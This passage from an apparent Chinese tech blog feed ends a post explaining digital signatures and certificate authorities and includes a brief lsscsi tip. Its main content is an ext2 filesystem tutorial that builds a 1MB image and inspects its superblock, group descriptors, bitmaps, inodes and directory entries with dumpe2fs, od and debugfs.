<p><img src="/images/certificate_theory/sign_3.png" alt="sign_3"></p>
<p><img src="/images/certificate_theory/sign_4.png" alt="sign_4"></p>
<p><img src="/images/certificate_theory/sign_5.png" alt="sign_5"></p>
<p>苏珊再对信件本身使用Hash函数，将得到的结果，与上一步得到的摘要进行对比。如果两者一致，就证明这封信未被修改过。</p>
<p><img src="/images/certificate_theory/cert_1.png" alt="cert_1"></p>
<p>复杂的情况出现了。道格想欺骗苏珊，他偷偷使用了苏珊的电脑，用自己的公钥换走了鲍勃的公钥。此时，苏珊实际拥有的是道格的公钥，但是还以为这是鲍勃的公钥。因此，道格就可以冒充鲍勃，用自己的私钥做成”数字签名”，写信给苏珊，让苏珊用假的鲍勃公钥进行解密。</p>
<p><img src="/images/certificate_theory/cert_2.png" alt="cert_2"></p>
<p>后来，苏珊感觉不对劲，发现自己无法确定公钥是否真的属于鲍勃。她想到了一个办法，要求鲍勃去找”证书中心”（certificate authority，简称CA），为公钥做认证。证书中心用自己的私钥，对鲍勃的公钥和一些相关信息一起加密，生成”数字证书”（Digital Certificate）。</p>
<p><img src="/images/certificate_theory/cert_3.png" alt="cert_3"></p>
<p>鲍勃拿到数字证书以后，就可以放心了。以后再给苏珊写信，只要在签名的同时，再附上数字证书就行了。</p>
<p><img src="/images/certificate_theory/cert_4.png" alt="cert_4"></p>
<p>苏珊收信后，用CA的公钥解开数字证书，就可以拿到鲍勃真实的公钥了，然后就能证明”数字签名”是否真的是鲍勃签的。</p>
<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="http://www.ruanyifeng.com/blog/2011/08/what_is_a_digital_signature.html">数字签名是什么？</a></li>
</ul>
]]></content>
      <categories>
        <category>security</category>
      </categories>
      <tags>
        <tag>certificate</tag>
        <tag>signature</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux中查看硬盘类型</title>
    <url>/2016/05/13/storage/20160513-linux-ssd-check/</url>
    <content><![CDATA[<h1 id="查看SCSI总线上的设备"><a href="#查看SCSI总线上的设备" class="headerlink" title="查看SCSI总线上的设备"></a>查看SCSI总线上的设备</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">lsscsi</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>storage</category>
      </categories>
      <tags>
        <tag>scsi</tag>
      </tags>
  </entry>
  <entry>
    <title>Ext2</title>
    <url>/2017/10/17/storage/fs-ext2/</url>
    <content><![CDATA[<p>一个磁盘可以划分成多个分区，每个分区必须先用格式化工具（例如某种mkfs命令）格式化成某种格式的文件系统，然后才能存储文件，格式化的过程会在磁盘上写一些管理存储布局的信息。</p>
<h1 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h1><p>文件系统中存储的最小单位是块（Block），一个块究竟多大是在格式化时确定的，例如mke2fs的-b选项可以设定块大小为1024、2048或4096字节。而上图中启动块（Boot Block）的大小是确定的，就是1KB，启动块是由PC标准规定的，用来存储磁盘分区信息和启动信息，任何文件系统都不能使用启动块。启动块之后才是ext2文件系统的开始，ext2文件系统将整个分区划成若干个同样大小的块组（Block Group）</p>
<p><img src="/images/ext2/fs-ext2layout.png" alt="fs-ext2layout.png"></p>
<h2 id="做一个EXT2看看"><a href="#做一个EXT2看看" class="headerlink" title="做一个EXT2看看"></a>做一个EXT2看看</h2><p>做一个EXT2的文件系统，然后将其挂载，看看其文件格式。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">dd</span> <span class="keyword">if</span>=/dev/zero of=./img.1m count=256 bs=4K</span></span><br><span class="line">...</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">mke2fs fs</span></span><br><span class="line">...</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> mount -o loop ./img.1m /mnt</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> umount /mnt</span></span><br></pre></td></tr></table></figure>

<p>使用<code>od</code>查看<code>img.1m</code>镜像文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">od -tx1 -Ax ./img.1m</span><br></pre></td></tr></table></figure>

<h2 id="Super-Block"><a href="#Super-Block" class="headerlink" title="Super Block"></a>Super Block</h2><p>描述整个分区的文件系统信息，例如块大小、文件系统版本号、上次mount的时间等等。超级块在每个块组的开头都有一份拷贝。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ext2_super_block</span> &#123;</span></span><br><span class="line">    __le32  s_inodes_count;     <span class="comment">/* Inodes count */</span></span><br><span class="line">    __le32  s_blocks_count;     <span class="comment">/* Blocks count */</span></span><br><span class="line">    __le32  s_r_blocks_count;   <span class="comment">/* Reserved blocks count */</span></span><br><span class="line">    __le32  s_free_blocks_count;    <span class="comment">/* Free blocks count */</span></span><br><span class="line">    __le32  s_free_inodes_count;    <span class="comment">/* Free inodes count */</span></span><br><span class="line">    __le32  s_first_data_block; <span class="comment">/* First Data Block */</span></span><br><span class="line">    __le32  s_log_block_size;   <span class="comment">/* Block size */</span></span><br><span class="line">    __le32  s_log_frag_size;    <span class="comment">/* Fragment size */</span></span><br><span class="line">    __le32  s_blocks_per_group; <span class="comment">/* # Blocks per group */</span></span><br><span class="line">    __le32  s_frags_per_group;  <span class="comment">/* # Fragments per group */</span></span><br><span class="line">    __le32  s_inodes_per_group; <span class="comment">/* # Inodes per group */</span></span><br><span class="line">    __le32  s_mtime;        <span class="comment">/* Mount time */</span></span><br><span class="line">    __le32  s_wtime;        <span class="comment">/* Write time */</span></span><br><span class="line">    __le16  s_mnt_count;        <span class="comment">/* Mount count */</span></span><br><span class="line">    __le16  s_max_mnt_count;    <span class="comment">/* Maximal mount count */</span></span><br><span class="line">    __le16  s_magic;        <span class="comment">/* Magic signature */</span></span><br><span class="line">    __le16  s_state;        <span class="comment">/* File system state */</span></span><br><span class="line">    __le16  s_errors;       <span class="comment">/* Behaviour when detecting errors */</span></span><br><span class="line">    __le16  s_minor_rev_level;  <span class="comment">/* minor revision level */</span></span><br><span class="line">    __le32  s_lastcheck;        <span class="comment">/* time of last check */</span></span><br><span class="line">    __le32  s_checkinterval;    <span class="comment">/* max. time between checks */</span></span><br><span class="line">    __le32  s_creator_os;       <span class="comment">/* OS */</span></span><br><span class="line">    __le32  s_rev_level;        <span class="comment">/* Revision level */</span></span><br><span class="line">    __le16  s_def_resuid;       <span class="comment">/* Default uid for reserved blocks */</span></span><br><span class="line">    __le16  s_def_resgid;       <span class="comment">/* Default gid for reserved blocks */</span></span><br><span class="line">    __le32  s_first_ino;        <span class="comment">/* First non-reserved inode */</span></span><br><span class="line">    __le16   s_inode_size;      <span class="comment">/* size of inode structure */</span></span><br><span class="line">    __le16  s_block_group_nr;   <span class="comment">/* block group # of this superblock */</span></span><br><span class="line">    __le32  s_feature_compat;   <span class="comment">/* compatible feature set */</span></span><br><span class="line">    __le32  s_feature_incompat;     <span class="comment">/* incompatible feature set */</span></span><br><span class="line">    __le32  s_feature_ro_compat;    <span class="comment">/* readonly-compatible feature set */</span></span><br><span class="line">    __u8    s_uuid[<span class="number">16</span>];     <span class="comment">/* 128-bit uuid for volume */</span></span><br><span class="line">    <span class="type">char</span>    s_volume_name[<span class="number">16</span>];  <span class="comment">/* volume name */</span></span><br><span class="line">    <span class="type">char</span>    s_last_mounted[<span class="number">64</span>];     <span class="comment">/* directory where last mounted */</span></span><br><span class="line">    __le32  s_algorithm_usage_bitmap; <span class="comment">/* For compression */</span></span><br><span class="line">    __u8    s_prealloc_blocks;  <span class="comment">/* Nr of blocks to try to preallocate*/</span></span><br><span class="line">    __u8    s_prealloc_dir_blocks;  <span class="comment">/* Nr to preallocate for dirs */</span></span><br><span class="line">    __u16   s_padding1;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Journaling support valid if EXT3_FEATURE_COMPAT_HAS_JOURNAL set.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    __u8    s_journal_uuid[<span class="number">16</span>]; <span class="comment">/* uuid of journal superblock */</span></span><br><span class="line">    __u32   s_journal_inum;     <span class="comment">/* inode number of journal file */</span></span><br><span class="line">    __u32   s_journal_dev;      <span class="comment">/* device number of journal file */</span></span><br><span class="line">    __u32   s_last_orphan;      <span class="comment">/* start of list of inodes to delete */</span></span><br><span class="line">    __u32   s_hash_seed[<span class="number">4</span>];     <span class="comment">/* HTREE hash seed */</span></span><br><span class="line">    __u8    s_def_hash_version; <span class="comment">/* Default hash version to use */</span></span><br><span class="line">    __u8    s_reserved_char_pad;</span><br><span class="line">    __u16   s_reserved_word_pad;</span><br><span class="line">    __le32  s_default_mount_opts;</span><br><span class="line">    __le32  s_first_meta_bg;    <span class="comment">/* First metablock block group */</span></span><br><span class="line">    __u32   s_reserved[<span class="number">190</span>];    <span class="comment">/* Padding to the end of the block */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><img src="/images/ext2/fs.sb.png" alt="fs.sb.png"></p>
<p>从000000开始的1KB是启动块，由于这不是一个真正的磁盘分区，启动块的内容全部为零。从000400到0007ff的1KB是超级块，可以对照着<code>dumpe2fs</code>分析。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">dumpe2fs ./img.1m                                                                                                                 1</span> </span><br><span class="line">dumpe2fs 1.42.9 (28-Dec-2013)</span><br><span class="line">Filesystem volume name:   &lt;none&gt;</span><br><span class="line">Last mounted on:          &lt;not available&gt;</span><br><span class="line">Filesystem UUID:          2b8250d9-29fa-459e-9e2d-8b9c887b860b</span><br><span class="line">Filesystem magic number:  0xEF53</span><br><span class="line">Filesystem revision #:    1 (dynamic)</span><br><span class="line">Filesystem features:      ext_attr resize_inode dir_index filetype sparse_super</span><br><span class="line">Filesystem flags:         signed_directory_hash</span><br><span class="line">Default mount options:    user_xattr acl</span><br><span class="line">Filesystem state:         not clean</span><br><span class="line">Errors behavior:          Continue</span><br><span class="line">Filesystem OS type:       Linux</span><br><span class="line">Inode count:              128</span><br><span class="line">Block count:              1024</span><br><span class="line">Reserved block count:     51</span><br><span class="line">Free blocks:              986</span><br><span class="line">Free inodes:              117</span><br><span class="line">First block:              1</span><br><span class="line">Block size:               1024</span><br><span class="line">Fragment size:            1024</span><br><span class="line">Reserved GDT blocks:      3</span><br><span class="line">Blocks per group:         8192</span><br><span class="line">Fragments per group:      8192</span><br><span class="line">Inodes per group:         128</span><br><span class="line">Inode blocks per group:   16</span><br><span class="line">Filesystem created:       Wed Oct 25 09:56:05 2017</span><br><span class="line">Last mount time:          Wed Oct 25 09:56:48 2017</span><br><span class="line">Last write time:          Wed Oct 25 09:56:48 2017</span><br><span class="line">Mount count:              1</span><br><span class="line">Maximum mount count:      -1</span><br><span class="line">Last checked:             Wed Oct 25 09:56:05 2017</span><br><span class="line">Check interval:           0 (&lt;none&gt;)</span><br><span class="line">Reserved blocks uid:      0 (user root)</span><br><span class="line">Reserved blocks gid:      0 (group root)</span><br><span class="line">First inode:              11</span><br><span class="line">Inode size:               128</span><br><span class="line">Default directory hash:   half_md4</span><br><span class="line">Directory Hash Seed:      2feeee23-e3de-4126-a60d-1d05a11b0ab3</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>块大小是1024字节，1MB的分区共有1024个块，第0个块是启动块，启动块之后才算ext2文件系统的开始，因此Group 0占据第1个到第1023个块，共1023个块。块位图占一个块，共有1024×8&#x3D;8192个bit，足够表示这1023个块了，因此只要一个块组就够了。默认是每8KB分配一个inode，因此1MB的分区对应128个inode，这些数据都和dumpe2fs的输出吻合。</p>
<h2 id="GDT-Group-Descriptor-Table"><a href="#GDT-Group-Descriptor-Table" class="headerlink" title="GDT(Group Descriptor Table)"></a>GDT(Group Descriptor Table)</h2><p>由很多块组描述符组成，整个分区分成多少个块组就对应有多少个块组描述符。每个块组描述符（Group Descriptor）存储一个块组的描述信息，例如在这个块组中从哪里开始是inode表，从哪里开始是数据块，空闲的inode和数据块还有多少个等等。和超级块类似，块组描述符表在每个块组的开头也都有一份拷贝，这些信息是非常重要的，一旦超级块意外损坏就会丢失整个分区的数据，一旦块组描述符意外损坏就会丢失整个块组的数据，因此它们都有多份拷贝。通常内核只用到第0个块组中的拷贝，当执行e2fsck检查文件系统一致性时，第0个块组中的超级块和块组描述符表就会拷贝到其它块组，这样当第0个块组的开头意外损坏时就可以用其它拷贝来恢复，从而减少损失。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Structure of a blocks group descriptor</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ext2_group_desc</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    __le32  bg_block_bitmap;        <span class="comment">/* Blocks bitmap block */</span></span><br><span class="line">    __le32  bg_inode_bitmap;        <span class="comment">/* Inodes bitmap block */</span></span><br><span class="line">    __le32  bg_inode_table;     <span class="comment">/* Inodes table block */</span></span><br><span class="line">    __le16  bg_free_blocks_count;   <span class="comment">/* Free blocks count */</span></span><br><span class="line">    __le16  bg_free_inodes_count;   <span class="comment">/* Free inodes count */</span></span><br><span class="line">    __le16  bg_used_dirs_count; <span class="comment">/* Directories count */</span></span><br><span class="line">    __le16  bg_pad;</span><br><span class="line">    __le32  bg_reserved[<span class="number">3</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><img src="/images/ext2/fs.gd.png" alt="fs.gd.png"></p>
<p>从000800开始是块组描述符表，这个文件系统较小，只有一个块组描述符，对照着dumpe2fs的输出信息分析</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">dumpe2fs ./img.1m                                                                                                                 1</span> </span><br><span class="line">...</span><br><span class="line">Group 0: (Blocks 1-1023)</span><br><span class="line">  主 superblock at 1, Group descriptors at 2-2</span><br><span class="line">  保留的GDT块位于 3-5</span><br><span class="line">  Block bitmap at 6 (+5), Inode bitmap at 7 (+6)</span><br><span class="line">  Inode表位于 8-23 (+7)</span><br><span class="line">  986 free blocks, 117 free inodes, 2 directories</span><br><span class="line">  可用块数: 38-1023</span><br><span class="line">  可用inode数: 12-128k</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>整个文件系统是1MB，每个块是1KB，应该有1024个块，除去启动块还有1023个块，分别编号为1-1023，它们全都属于Group 0。其中，Block 1是超级块，接下来的块组描述符指出，块位图是Block 6，因此中间的Block 2-5是块组描述符表，其中Block 3-5保留未用。块组描述符还指出，inode位图是Block 7，inode表是从Block 8开始的，那么inode表到哪个块结束呢？由于超级块中指出每个块组有128个inode，每个inode的大小是128字节，因此共占16个块，inode表的范围是Block 8-23。从Block 24开始就是数据块了。块组描述符中指出，空闲的数据块有986个，由于文件系统是新创建的，空闲块是连续的Block 38-1023，用掉了前面的Block 24-37</p>
<h2 id="Block-Bitmap"><a href="#Block-Bitmap" class="headerlink" title="Block Bitmap"></a>Block Bitmap</h2><p>一个块组中的块是这样利用的：数据块（Data Block）存储所有文件的数据，比如某个分区的块大小是1024字节，某个文件是2049字节，那么就需要三个数据块来存，即使第三个块只存了一个字节也需要占用一个整块；超级块、块组描述符表、块位图、inode位图、inode表这几部分存储该块组的描述信息。那么如何知道哪些块已经用来存储文件数据或其它描述信息，哪些块仍然空闲可用呢？块位图就是用来描述整个块组中哪些块已用哪些块空闲的，它本身占一个块，其中的每个bit代表本块组中的一个块，这个bit为1表示该块已用，这个bit为0表示该块空闲可用。<br>为什么用df命令统计整个磁盘的已用空间非常快呢？因为只需要查看每个块组的块位图即可，而不需要搜遍整个分区。相反，用du命令查看一个较大目录的已用空间就非常慢，因为不可避免地要搜遍整个目录的所有文件。<br>与此相联系的另一个问题是：在格式化一个分区时究竟会划出多少个块组呢？主要的限制在于块位图本身必须只占一个块。用mke2fs格式化时默认块大小是1024字节，可以用-b参数指定块大小，现在设块大小指定为b字节，那么一个块可以有8b个bit，这样大小的一个块位图就可以表示8b个块的占用情况，因此一个块组最多可以有8b个块，如果整个分区有s个块，那么就可以有s&#x2F;(8b)个块组。格式化时可以用-g参数指定一个块组有多少个块，但是通常不需要手动指定，mke2fs工具会计算出最优的数值。</p>
<p><img src="/images/ext2/fs_blk_bmp.png" alt="fs_blk_bmp.png"></p>
<p>从块位图中可以看出，前37位（前4个字节加最后一个字节的低5位）都是1，，就表示Block 1-37已用。在块位图中，Block 38-1023对应的位都是0（一直到001870那一行最后一个字节的低7位），接下来的位已经超出了文件系统的空间，不管是0还是1都没有意义。可见，块位图每个字节中的位应该按从低位到高位的顺序来看。以后随着文件系统的使用和添加删除文件，块位图中的1就变得不连续了。</p>
<h2 id="Inode-Bitmap"><a href="#Inode-Bitmap" class="headerlink" title="Inode Bitmap"></a>Inode Bitmap</h2><p>和块位图类似，本身占一个块，其中每个bit表示一个inode是否空闲可用。</p>
<p><img src="/images/ext2/fs_inode_bmp.png" alt="fs_inode_bmp.png"></p>
<p>块组描述符指出，空闲的inode有117个，由于文件系统是新创建的，空闲的inode也是连续的，inode编号从1到128，空闲的inode编号从12到128。从inode位图可以看出，前11位都是1，表示前11个inode已用。以后随着文件系统的使用和添加删除文件，inode位图中的1就变得不连续了。001c00这一行的128位就表示了所有inode，因此下面的行不管是0还是1都没有意义。已用的11个inode中，前10个inode是被ext2文件系统保留的，其中第2个inode是根目录，第11个inode是lost+found目录，块组描述符也指出该组有两个目录，就是根目录和lost+found。</p>
<h2 id="Inode-Table"><a href="#Inode-Table" class="headerlink" title="Inode Table"></a>Inode Table</h2><p>一个文件除了数据需要存储之外，一些描述信息也需要存储，例如文件类型（常规、目录、符号链接等），权限，文件大小，创建&#x2F;修改&#x2F;访问时间等，也就是ls -l命令看到的那些信息，这些信息存在inode中而不是数据块中。每个文件都有一个inode，一个块组中的所有inode组成了inode表。<br>inode表占多少个块在格式化时就要决定并写入块组描述符中，mke2fs格式化工具的默认策略是一个块组有多少个8KB就分配多少个inode。由于数据块占了整个块组的绝大部分，也可以近似认为数据块有多少个8KB就分配多少个inode，换句话说，如果平均每个文件的大小是8KB，当分区存满的时候inode表会得到比较充分的利用，数据块也不浪费。如果这个分区存的都是很大的文件（比如电影），则数据块用完的时候inode会有一些浪费，如果这个分区存的都是很小的文件（比如源代码），则有可能数据块还没用完inode就已经用完了，数据块可能有很大的浪费。如果用户在格式化时能够对这个分区以后要存储的文件大小做一个预测，也可以用mke2fs的-i参数手动指定每多少个字节分配一个inode。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Structure of an inode on the disk</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ext2_inode</span> &#123;</span></span><br><span class="line">    __le16  i_mode;     <span class="comment">/* File mode */</span></span><br><span class="line">    __le16  i_uid;      <span class="comment">/* Low 16 bits of Owner Uid */</span></span><br><span class="line">    __le32  i_size;     <span class="comment">/* Size in bytes */</span></span><br><span class="line">    __le32  i_atime;    <span class="comment">/* Access time */</span></span><br><span class="line">    __le32  i_ctime;    <span class="comment">/* Creation time */</span></span><br><span class="line">    __le32  i_mtime;    <span class="comment">/* Modification time */</span></span><br><span class="line">    __le32  i_dtime;    <span class="comment">/* Deletion Time */</span></span><br><span class="line">    __le16  i_gid;      <span class="comment">/* Low 16 bits of Group Id */</span></span><br><span class="line">    __le16  i_links_count;  <span class="comment">/* Links count */</span></span><br><span class="line">    __le32  i_blocks;   <span class="comment">/* Blocks count */</span></span><br><span class="line">    __le32  i_flags;    <span class="comment">/* File flags */</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            __le32  l_i_reserved1;</span><br><span class="line">        &#125; linux1;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            __le32  h_i_translator;</span><br><span class="line">        &#125; hurd1;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            __le32  m_i_reserved1;</span><br><span class="line">        &#125; masix1;</span><br><span class="line">    &#125; osd1;             <span class="comment">/* OS dependent 1 */</span></span><br><span class="line">    __le32  i_block[EXT2_N_BLOCKS];<span class="comment">/* Pointers to blocks */</span></span><br><span class="line">    __le32  i_generation;   <span class="comment">/* File version (for NFS) */</span></span><br><span class="line">    __le32  i_file_acl; <span class="comment">/* File ACL */</span></span><br><span class="line">    __le32  i_dir_acl;  <span class="comment">/* Directory ACL */</span></span><br><span class="line">    __le32  i_faddr;    <span class="comment">/* Fragment address */</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            __u8    l_i_frag;   <span class="comment">/* Fragment number */</span></span><br><span class="line">            __u8    l_i_fsize;  <span class="comment">/* Fragment size */</span></span><br><span class="line">            __u16   i_pad1;</span><br><span class="line">            __le16  l_i_uid_high;   <span class="comment">/* these 2 fields    */</span></span><br><span class="line">            __le16  l_i_gid_high;   <span class="comment">/* were reserved2[0] */</span></span><br><span class="line">            __u32   l_i_reserved2;</span><br><span class="line">        &#125; linux2;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            __u8    h_i_frag;   <span class="comment">/* Fragment number */</span></span><br><span class="line">            __u8    h_i_fsize;  <span class="comment">/* Fragment size */</span></span><br><span class="line">            __le16  h_i_mode_high;</span><br><span class="line">            __le16  h_i_uid_high;</span><br><span class="line">            __le16  h_i_gid_high;</span><br><span class="line">            __le32  h_i_author;</span><br><span class="line">        &#125; hurd2;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            __u8    m_i_frag;   <span class="comment">/* Fragment number */</span></span><br><span class="line">            __u8    m_i_fsize;  <span class="comment">/* Fragment size */</span></span><br><span class="line">            __u16   m_pad1;</span><br><span class="line">            __u32   m_i_reserved2[<span class="number">2</span>];</span><br><span class="line">        &#125; masix2;</span><br><span class="line">    &#125; osd2;             <span class="comment">/* OS dependent 2 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>根目录inode信息：<br><img src="/images/ext2/fs.rootinode.png" alt="fs.rootinode.png"></p>
<p>st_mode以八进制表示，包含了文件类型和文件权限，最高位的4表示文件类型为目录（各种文件类型的编码详见stat(2)），低位的755表示权限。Size是1024，说明根目录现在只有一个数据块。Links为3表示根目录有三个硬链接，分别是根目录下的.和..，以及lost+found子目录下的..。注意，虽然我们通常用&#x2F;表示根目录，但是并没有名为&#x2F;的硬链接，事实上，&#x2F;是路径分隔符，不能在文件名中出现。这里的Blockcount是以512字节为一个块来数的，并非格式化文件系统时所指定的块大小，磁盘的最小读写单位称为扇区（Sector），通常是512字节，所以Blockcount是磁盘的物理块数量，而非分区的逻辑块数量。根目录数据块的位置由上图中的Blocks[0]指出，也就是第24个块，它在文件系统中的位置是24×0x400&#x3D;0x6000</p>
<p>探索文件系统还有一个很有用的工具debugfs，它提供一个命令行界面，可以对文件系统做各种操作，例如查看信息、恢复数据、修正文件系统中的错误。使用<code>debugfs ./img.1m</code>打开文件系统，使用<code>stat ／</code>命令查看根目录inode信息</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Inode: 2   Type: directory    Mode:  0755   Flags: 0x0</span><br><span class="line">Generation: 0    Version: 0x00000000</span><br><span class="line">User:     0   Group:     0   Size: 1024</span><br><span class="line">File ACL: 0    Directory ACL: 0</span><br><span class="line">Links: 3   Blockcount: 2</span><br><span class="line">Fragment:  Address: 0    Number: 0    Size: 0</span><br><span class="line">ctime: 0x59efef35 -- Wed Oct 25 09:56:05 2017</span><br><span class="line">atime: 0x59efef63 -- Wed Oct 25 09:56:51 2017</span><br><span class="line">mtime: 0x59efef35 -- Wed Oct 25 09:56:05 2017</span><br><span class="line">BLOCKS:</span><br><span class="line">(0):24</span><br><span class="line">TOTAL: 1</span><br></pre></td></tr></table></figure>

<h3 id="数据块寻址"><a href="#数据块寻址" class="headerlink" title="数据块寻址"></a>数据块寻址</h3><p>通过<code>__le32  i_block[EXT2_N_BLOCKS]</code>来完成数据块的寻址。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Constants relative to the data blocks</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EXT2_NDIR_BLOCKS        12</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EXT2_IND_BLOCK          EXT2_NDIR_BLOCKS</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EXT2_DIND_BLOCK         (EXT2_IND_BLOCK + 1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EXT2_TIND_BLOCK         (EXT2_DIND_BLOCK + 1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EXT2_N_BLOCKS           (EXT2_TIND_BLOCK + 1)</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>EXT2_NDIR_BLOCKS</code><br>  <code>i_block</code>前12项属于直接寻址，直接存储数据块的”block id”。所以总共可记录 12 笔记录，总额大小为12*1k＝12k</li>
<li><code>EXT2_IND_BLOCK</code><br>  <code>i_block</code>第13项为一级间接寻址，每笔 block 号码的记录会花去 4bytes，因此 1K 的大小能够记录 256 笔记录，因此一个间接可以记录的文件大小为(1k&#x2F;4)*1K&#x3D;256k</li>
<li><code>EXT2_DIND_BLOCK</code><br>  <code>i_block</code>第14项为二级间接寻址，第一层 block 会指定 256 个第二层，每个第二层可以指定 256 个号码，因此总额大小为256<em>256</em>1k</li>
<li><code>EXT2_TIND_BLOCK</code><br>  <code>i_block</code>第15项为三级间接寻址，第一层 block 会指定 256 个第二层，每个第二层可以指定 256 个第三层，每个第三层可以指定 256 个号码，因此总额大小为256<em>256</em>256*1k</li>
</ul>
<p>*** 总容量为直接寻址＋一级间接＋二级间接＋三级间接＝16.06GB ***</p>
<p><img src="/images/ext2/fs.datablockaddr.png" alt="fs.datablockaddr.png"></p>
<h2 id="Blocks"><a href="#Blocks" class="headerlink" title="Blocks"></a>Blocks</h2><ul>
<li>对于常规文件，文件的数据存储在数据块中。</li>
<li>对于目录，该目录下的所有文件名和目录名存储在数据块中，注意文件名保存在它所在目录的数据块中，除文件名之外，ls -l命令看到的其它信息都保存在该文件的inode中。注意这个概念：目录也是一种文件，是一种特殊类型的文件。</li>
<li>对于符号链接，如果目标路径名较短则直接保存在inode中以便更快地查找，如果目标路径名较长则分配一个数据块来保存。</li>
<li>设备文件、FIFO和socket等特殊文件没有数据块，设备文件的主设备号和次设备号保存在inode中。</li>
</ul>
<p>根目录的数据结构</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ext2_dir_entry_2</span> &#123;</span></span><br><span class="line">    __le32  inode;          <span class="comment">/* Inode number */</span></span><br><span class="line">    __le16  rec_len;        <span class="comment">/* Directory entry length */</span></span><br><span class="line">    __u8    name_len;       <span class="comment">/* Name length */</span></span><br><span class="line">    __u8    file_type;</span><br><span class="line">    <span class="type">char</span>    name[];         <span class="comment">/* File name, up to EXT2_NAME_LEN */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>根目录的数据块<br><img src="/images/ext2/fs.datablock.png" alt="fs.datablock.png"></p>
<p>根据上文中根目录inode信息找到根目录数据块006000地址，目录的数据块由许多不定长的记录组成，每条记录描述该目录下的一个文件，在上图中用框表示。第一条记录描述inode号为2的文件，也就是根目录本身，该记录的总长度为12字节，其中文件名的长度为1字节，文件类型为2（见下表，注意此处的文件类型编码和st_mode不一致），文件名是<code>.</code>。第二条记录也是描述inode号为2的文件（根目录），该记录总长度为12字节，其中文件名的长度为2字节，文件类型为2，文件名字符串是..。第三条记录一直延续到该数据块的末尾，描述inode号为11的文件（lost+found目录），该记录的总长度为1000字节（和前面两条记录加起来是1024字节），文件类型为2，文件名字符串是lost+found，后面全是0字节。如果要在根目录下创建新的文件，可以把第三条记录截短，在原来的0字节处创建新的记录。如果该目录下的文件名太多，一个数据块不够用，则会分配新的数据块，块编号会填充到inode的Blocks[1]字段。</p>
<table>
<thead>
<tr>
<th align="center">编码</th>
<th align="left">文件类型(file type)</th>
</tr>
</thead>
<tbody><tr>
<td align="center">0</td>
<td align="left">Unknown</td>
</tr>
<tr>
<td align="center">1</td>
<td align="left">Regular File</td>
</tr>
<tr>
<td align="center">2</td>
<td align="left">Directory</td>
</tr>
<tr>
<td align="center">3</td>
<td align="left">Character device</td>
</tr>
<tr>
<td align="center">4</td>
<td align="left">Block device</td>
</tr>
<tr>
<td align="center">5</td>
<td align="left">Named pipe</td>
</tr>
<tr>
<td align="center">6</td>
<td align="left">Socket</td>
</tr>
<tr>
<td align="center">7</td>
<td align="left">Symbolic link</td>
</tr>
</tbody></table>
<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="http://docs.linuxtone.org/ebooks/C&CPP/c/ch29s02.html">ext2文件系统</a></li>
<li><a href="http://www.cnblogs.com/ggjucheng/archive/2012/08/22/2651641.html#ext2_filesystem">EXT2 文件系统</a></li>
<li><a href="http://www.cnblogs.com/f-ck-need-u/p/7016077.html">ext文件系统机制</a></li>
</ul>
]]></content>
